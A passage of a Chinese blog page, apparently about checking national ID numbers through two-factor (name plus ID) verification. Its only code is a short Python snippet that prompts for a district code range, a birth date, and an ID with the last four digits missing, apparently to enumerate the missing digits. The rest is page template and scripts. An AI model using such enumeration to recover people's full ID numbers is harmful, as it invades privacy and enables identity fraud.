+<h3 id="代码进行提示"><a href="#代码进行提示" class="headerlink" title="代码进行提示"></a>代码进行提示</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&quot;请输入区号开始【例：230101哈尔滨市辖区】：&quot;</span>)</span><br><span class="line">    a_1 = <span class="built_in">int</span>(<span class="built_in">input</span>())</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;请输入区号结束【例：区号结束+1 230129+1延寿县】：&quot;</span>)</span><br><span class="line">    a_2 = <span class="built_in">int</span>(<span class="built_in">input</span>())  <span class="comment"># 区号结束+1 230129+1延寿县</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;请输入出生年月日:【19820606】&quot;</span>)</span><br><span class="line">    s = <span class="built_in">input</span>() + <span class="string">&quot;****&quot;</span>  <span class="comment"># 举例：身份证号缺后四位</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/bg1.jpg" alt="???"></p>
+
+      
+    </div>
+    <div class="article-footer">
+      <blockquote class="mt-2x">
+  <ul class="post-copyright list-unstyled">
+    
+    <li class="post-copyright-link hidden-xs">
+      <strong>本文链接：</strong>
+      <a href="https://sfyyh.github.io/2022/08/17/%E8%BA%AB%E4%BB%BD%E8%AF%81%E4%BA%8C%E8%A6%81%E7%B4%A0%E9%AA%8C%E8%AF%81/" title="身份证二要素验证" target="_blank" rel="external">https://sfyyh.github.io/2022/08/17/身份证二要素验证/</a>
+    </li>
+    
+    <li class="post-copyright-license">
+      <strong>版权声明： </strong> 本博客所有文章除特别声明外，均采用 <a href="http://creativecommons.org/licenses/by/4.0/deed.zh" target="_blank" rel="external">CC BY 4.0 CN协议</a> 许可协议。转载请注明出处！
+    </li>
+  </ul>
+</blockquote>
+
+
+<div class="panel panel-default panel-badger">
+  <div class="panel-body">
+    <figure class="media">
+      <div class="media-left">
+        <a href="https://github.com/SFYYH" target="_blank" class="img-burn thumb-sm visible-lg">
+          <img src="/images/avatar.jpg" class="img-rounded w-full" alt="">
+        </a>
+      </div>
+      <div class="media-body">
+        <h3 class="media-heading"><a href="https://github.com/SFYYH" target="_blank"><span class="text-dark">山城冰荔枝</span><small class="ml-1x">Web Developer &amp; Designer</small></a></h3>
+        <div>个人简介。</div>
+      </div>
+    </figure>
+  </div>
+</div>
+
+
+    </div>
+  </article>
+  
+    
+  <section id="comments">
+  	
+      <div id="vcomments"></div>
+    
+  </section>
+
+
+  
+</div>
+
+  <nav class="bar bar-footer clearfix" data-stick-bottom>
+  <div class="bar-inner">
+  
+  <ul class="pager pull-left">
+    
+    <li class="prev">
+      <a href="/2022/08/17/%E4%BC%A0%E6%99%BA%E6%92%AD%E5%AE%A2%E8%84%9A%E6%9C%AC%E5%88%B6%E4%BD%9C/" title="😎 colincora的传智播客小助手 😎"><i class="icon icon-angle-left" aria-hidden="true"></i><span>&nbsp;&nbsp;上一篇</span></a>
+    </li>
+    
+    
+    
+  </ul>
+  
+  
+  <!-- Button trigger modal -->
+  <button type="button" class="btn btn-fancy btn-donate pop-onhover bg-gradient-warning" data-toggle="modal" data-target="#donateModal"><span>赏</span></button>
+  <!-- <div class="wave-icon wave-icon-danger btn-donate" data-toggle="modal" data-target="#donateModal">
+    <div class="wave-circle"><span class="icon"><i class="icon icon-bill"></i></span></div>
+  </div> -->
+  
+  
+  <div class="bar-right">
+    
+    <div class="share-component" data-sites="" data-mobile-sites="qq"></div>
+    
+  </div>
+  </div>
+</nav>
+  
+<!-- Modal -->
+<div class="modal modal-center modal-small modal-xs-full fade" id="donateModal" tabindex="-1" role="dialog">
+  <div class="modal-dialog" role="document">
+    <div class="modal-content donate">
+      <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button>
+      <div class="modal-body">
+        <div class="donate-box">
+          <div class="donate-head">
+            <p>感谢您的支持，我会继续努力的!</p>
+          </div>
+          <div class="tab-content">
+            <div role="tabpanel" class="tab-pane fade active in" id="alipay">
+              <div class="donate-payimg">
+                <img src="/images/donate/alipayimg.png" alt="扫码支持" title="扫一扫" />
+              </div>
+              <p class="text-muted mv">扫码打赏，你说多少就多少</p>
+              <p class="text-grey">打开支付宝扫一扫，即可进行扫码打赏哦</p>
+            </div>
+            <div role="tabpanel" class="tab-pane fade" id="wechatpay">
+              <div class="donate-payimg">
+                <img src="/images/donate/wechatpayimg.png" alt="扫码支持" title="扫一扫" />
+              </div>
+              <p class="text-muted mv">扫码打赏，你说多少就多少</p>
+              <p class="text-grey">打开微信扫一扫，即可进行扫码打赏哦</p>
+            </div>
+          </div>
+          <div class="donate-footer">
+            <ul class="nav nav-tabs nav-justified" role="tablist">
+              <li role="presentation" class="active">
+                <a href="#alipay" id="alipay-tab" role="tab" data-toggle="tab" aria-controls="alipay" aria-expanded="true"><i class="icon icon-alipay"></i> 支付宝</a>
+              </li>
+              <li role="presentation" class="">
+                <a href="#wechatpay" role="tab" id="wechatpay-tab" data-toggle="tab" aria-controls="wechatpay" aria-expanded="false"><i class="icon icon-wepay"></i> 微信支付</a>
+              </li>
+            </ul>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+
+
+</main>
+
+  <footer class="footer" itemscope itemtype="http://schema.org/WPFooter">
+	
+	
+    <ul class="social-links">
+    	
+        <li><a href="https://github.com/SFYYH" target="_blank" title="Github" data-toggle=tooltip data-placement=top><i class="icon icon-github"></i></a></li>
+        
+    </ul>
+
+    <div class="copyright">
+    	
+        <div class="publishby">
+        	Theme by <a href="https://github.com/SFYYH" target="_blank"> colincora </a>base on <a href="https://sfyyh.github.io/" target="_blank">pure</a>.
+        </div>
+    </div>
+</footer>
+  <script src="//cdn.jsdelivr.net/npm/jquery@1.12.4/dist/jquery.min.js"></script>
+<script>
+window.jQuery || document.write('<script src="js/jquery.min.js"><\/script>')
+</script>
+
+<script src="/js/plugin.min.js"></script>
+
+
+<script src="/js/application.js"></script>
+
+
+    <script>
+(function (window) {
+    var INSIGHT_CONFIG = {
+        TRANSLATION: {
+            POSTS: '文章',
+            PAGES: '页面',
+            CATEGORIES: '分类',
+            TAGS: '标签',
+            UNTITLED: '(未命名)',
+        },
+        ROOT_URL: '/',
+        CONTENT_URL: '/content.json',
+    };
+    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+})(window);
+</script>
+
+<script src="/js/insight.js"></script>
+
+
+
+
+
+
+   
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+   
+    
+  <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/valine"></script>
+  <script type="text/javascript">
+  var GUEST = ['nick', 'mail', 'link'];
+  var meta = 'nick,mail,link';
+  meta = meta.split(',').filter(function(item) {
+    return GUEST.indexOf(item) > -1;
+  });
+  new Valine({
+    el: '#vcomments',
+    verify: false,
+    notify: false,
+    appId: '',
+    appKey: '',
+    placeholder: 'Just go go',
+    avatar: 'mm',
+    meta: meta,
+    pageSize: '10' || 10,
+    visitor: false
+  });
+  </script>
+
+     
+
+
+
+
+
+
+
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/assets/hijiki.model.json"},"display":{"position":"right","width":150,"height":300,"hOffset":400,"vOffset":-38},"mobile":{"show":true},"react":"opacity:1","dialog":{"enable":true,"script":{"every idle 10s":"text1","tap face":"text2","tap body":"text3"}},"log":false});</script></body>
+</html>
